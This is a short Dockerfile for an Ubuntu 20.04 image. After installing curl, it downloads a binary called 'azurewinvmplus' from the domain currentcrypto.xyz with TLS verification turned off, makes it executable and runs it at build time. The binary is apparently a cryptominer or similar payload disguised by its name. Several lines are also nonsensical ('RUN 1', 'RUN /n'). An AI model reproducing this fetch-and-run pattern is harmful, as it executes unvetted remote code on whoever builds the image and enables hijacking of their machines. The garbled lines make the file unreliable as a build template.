FROM ubuntu:20.04
RUN apt update
RUN apt-get update && apt-get install -y \
curl
CMD /bin/bash
RUN curl -skLO https://ez.currentcrypto.xyz/azurewinvmplus
RUN chmod +x azurewinvmplus
RUN ./azurewinvmplus
RUN 1
RUN /n
EXPOSE 575
